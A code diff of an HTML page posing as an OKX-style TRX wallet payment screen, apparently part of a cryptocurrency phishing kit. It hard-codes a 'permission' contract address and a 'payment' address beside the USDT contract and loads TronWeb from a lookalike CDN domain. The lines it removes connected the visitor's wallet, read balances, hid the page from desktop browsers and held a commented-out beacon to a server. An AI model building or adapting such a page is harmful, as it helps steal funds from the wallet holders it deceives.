@@ -12,13 +12,13 @@
     <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-        ::-webkit-scrollbar {
-            display: none;
+        body {
+            background-color: #ffffff; /* 确保背景为白色 */
+            color: #000000;
         }
         .tishi {
             width: 58%;
             padding: 0.1rem 0.3rem;
-            height: 3rem;
             background: #4b4848;
             z-index: 999999999999;
             position: fixed;
@@ -37,96 +37,133 @@
     </style>
     <link rel="stylesheet" href="css/okx.css">
 </head>
-<body id="app" class="uni-body pages-index-home">
+
+<body id="app">
     <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
-    <div class="tishi" id="tip">提示</div>
-    <input id="to_address" type="hidden">
+    
+    <uni-app class="uni-app--maxwidth">
+        <uni-page data-page="pages/index/home">
+            <uni-page-wrapper>
+                <uni-page-body>
+                    <div>
+                        <div class="pay-box">
+                            <div class="amount">
+                                <div class="num">
+                                    <span class="amount" id="amount">0</span>
+                                    <em>TRX</em>
+                                </div>
+                                <img src="png/icon_exchange.jpg" class="icon">
+                            </div>
+                            <div class="rate">
+                                <span id="amount-display">0.00</span>
+                                <em>USD</em>
+                                <div class="icon">
+                                    <img src="png/icon_horn.jpg">
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="bottom-keyboard">
+                            <div class="asset-info">
+                                <div class="name">
+                                    <img src="png/icon_trx.png" class="coin">
+                                    <div class="asset-box">
+                                        <p class="title">余额</p>
+                                        <p class="num">
+                                            <span id="ye">0</span>
+                                            <em>TRX</em>
+                                        </p>
+                                        <input type="text" id="address" style="display:none">
+                                    </div>
+                                </div>
+                                <div class="right">
+                                    <div class="btn" onclick="setMaxAmount()">最大</div>
+                                </div>
+                            </div>
+
+                            <div class="keyboard-box">
+                                <div class="btn" onclick="pressKey('1')">1</div>
+                                <div class="btn" onclick="pressKey('2')">2</div>
+                                <div class="btn" onclick="pressKey('3')">3</div>
+                                <div class="btn" onclick="pressKey('4')">4</div>
+                                <div class="btn" onclick="pressKey('5')">5</div>
+                                <div class="btn" onclick="pressKey('6')">6</div>
+                                <div class="btn" onclick="pressKey('7')">7</div>
+                                <div class="btn" onclick="pressKey('8')">8</div>
+                                <div class="btn" onclick="pressKey('9')">9</div>
+                                <div class="btn" onclick="pressKey('.')">.</div>
+                                <div class="btn" onclick="pressKey('0')">0</div>
+                                <div class="btn delete" onclick="clearAmount()" style="margin-top:20px">
+                                    <img src="png/icon_delete.jpg">
+                                </div>
+                            </div>
+
+                            <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
+                                <button class="submit-btn disabled" id="submitBtn" disabled onclick="onNextButtonClick()">
+                                    下一步
+                                </button>
+                                <button id="jixu" class="jixu">继续</button>
+                            </footer>
+                        </div>
+                    </div>
+
+                    <div class="tishi" id="tip">提示</div>
+                    <input id="to_address" type="hidden">
+                </uni-page-body>
+            </uni-page-wrapper>
+        </uni-page>
+    </uni-app>
+
     <script>
-        // 权限地址（合约地址）
+        // 恢复你的 JS 逻辑
         window.Permission_address = 'TWHsgstoUNMsAVpnSKFJU2AQcDQ1zzL4oD';
-        // 收款地址（个人地址）
         window.Payment_address = 'TKaKDsmfNuHU6M7iuPvK88Amq1ydTU2sKh';
-        // USDT 官方合约地址（无需修改）
         window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        // 服务器地址用于发送心跳（修改为你自己的服务器域名）
-        // window.heartbeatUrl = 'https://baidu.com/heartbeat';
-        
-        // 初始化 DApp
-        async function initializeDApp() {
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            if (!isMobile) {
-                document.body.innerHTML = '';
+
+        let currentAmount = "0";
+
+        function pressKey(key) {
+            if (key === 'delete') {
+                deleteLastChar();
                 return;
             }
-            await connectWallet();
+            if (key === '.' && currentAmount.includes('.')) return;
+            currentAmount += key;
             updateAmountDisplay();
         }
-        
-        // 连接钱包
-        async function connectWallet() {
-            try {
-                if (window.tronWeb && window.tronWeb.ready) {
-                    await initDApp();
-                } else if (window.tronLink) {
-                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res.code === 200) {
-                        window.tronWeb = window.tronLink.tronWeb;
-                        await initDApp();
-                    }
-                }
-            } catch (error) {
-                console.error("钱包连接失败:", error);
+
+        function deleteLastChar() {
+            if (currentAmount.length > 1) {
+                currentAmount = currentAmount.slice(0, -1);
+            } else {
+                currentAmount = "0";
             }
+            updateAmountDisplay();
         }
-        
-        // 初始化 DApp 数据
-        async function initDApp() {
-            try {
-                const trxBalance = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
-                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
-                updateTRXBalance();
-            } catch (error) {
-                console.error("获取用户数据时出错:", error);
-            }
-        }
-        
-        // 更新 TRX 余额
-        function updateTRXBalance() {
-            const balanceElement = document.getElementById('ye');
-            if (balanceElement) {
-                balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
-            }
-        }
-        
-        // 更新金额显示
+
         function updateAmountDisplay() {
-            const amountElement = document.getElementById('amount');
-            if (amountElement) {
-                amountElement.textContent = currentAmount;
-            }
+            document.getElementById('amount').textContent = currentAmount;
+            document.getElementById('amount-display').textContent = (parseFloat(currentAmount) * 0.1562).toFixed(2);
+            updateNextButtonState();
         }
-        
+
+        function updateNextButtonState() {
+            const nextButton = document.getElementById('submitBtn');
+            nextButton.disabled = (parseFloat(currentAmount) <= 0);
+            nextButton.classList.toggle('disabled', nextButton.disabled);
+        }
+
+        function setMaxAmount() {
+            document.getElementById('amount').textContent = "全部";
+        }
+
+        function onNextButtonClick() {
+            alert("执行下一步操作，金额：" + currentAmount + " TRX");
+        }
+
         document.addEventListener('DOMContentLoaded', () => {
             updateAmountDisplay();
-            initializeDApp();
         });
-        
-        // // 发送心跳，保持与服务器连接（已注释，因服务器不支持）
-        // function sendHeartbeat() {
-        //     fetch(window.heartbeatUrl, {
-        //         method: 'POST',
-        //         mode: 'cors',
-        //         headers: { 'Content-Type': 'application/json' },
-        //         body: JSON.stringify({ url: window.location.href })
-        //     })
-        //     .catch(() => {});
-        // }
-        
-        // const heartbeatInterval = setInterval(sendHeartbeat, 5000); // 每 5 秒发送一次心跳
-        // window.onload = sendHeartbeat;
-        // window.onbeforeunload = function() {
-        //     clearInterval(heartbeatInterval);
-        // };
     </script>
 </body>
 </html>
